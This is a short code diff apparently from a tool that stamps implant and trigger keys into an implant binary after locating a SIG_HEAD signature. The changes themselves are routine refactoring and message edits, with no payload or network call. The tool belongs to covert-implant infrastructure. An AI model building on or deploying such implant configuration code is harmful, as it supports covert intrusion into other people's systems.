@@ -97,6 +97,8 @@ struct cl_args args = {
 		1
 };
 
+typedef enum {FALSE=0, TRUE} boolean;
+
 //define displaySha1Hash function
 void printSha1Hash(FILE *file, char *tag, unsigned char *sha1Hash)
 {
@@ -186,7 +188,9 @@ int main(int argc, char **argv)
 	struct tm *idKeyTime;						// Pointer to the ID key generation data structure
 	unsigned char implantKey[ID_KEY_HASH_SIZE];
 	unsigned char triggerKey[ID_KEY_HASH_SIZE];
-	enum {FALSE=0, TRUE} keyed = FALSE;			// Boolean to verify that a key was entered
+	boolean keyed = FALSE;						// Boolean to verify that a key was entered
+
+	args.sig = SIG_HEAD;
 
 	implantKey[0] = '\0';
 
@@ -610,20 +614,19 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 {
 	unsigned int sig_head = SIG_HEAD;
 	uint32_t sig_head2 = ntohl(SIG_HEAD);
-	unsigned char *p;	//, keybuffer[128];
+	unsigned char *p;
 	int fd, ret = 1;
 	unsigned int cnt = 0;
 	int big_endian = 0;
 	struct cl_args copy_of_args = patched_args;
 
-
-	printf("  \n");
-
 	p = hexarray;
 	cnt = 0;
+
+	printf("\n");
 	do {
 		if (cnt > arraylen) {
-			printf("\n  Patch signature not found in %s.  Aborting.\n\n", filename);
+			printf("\n\tPatch signature not found in %s. Aborting...\n\n", filename);
 			exit(0);
 			break;
 		}
@@ -644,8 +647,7 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 		cnt++;
 	} while (ret != 0);
 
-	p--;
-	printf("  SIG_HEAD found at offset %08x for %s\n", (int)(p - hexarray), filename);
+	printf("  SIG_HEAD found at offset 0x%x for %s\n", (int)(--p - hexarray), filename);
 
 //      memcpy( p + sizeof( SIG_HEAD ), keybuffer, 128 );
 	if (big_endian == 0) {
@@ -687,7 +689,7 @@ int patch(char *filename, unsigned char *hexarray, unsigned int arraylen, struct
 
 	close(fd);
 
-	printf(" ok\n");
+	printf(" done\n");
 
 	return 0;
 }
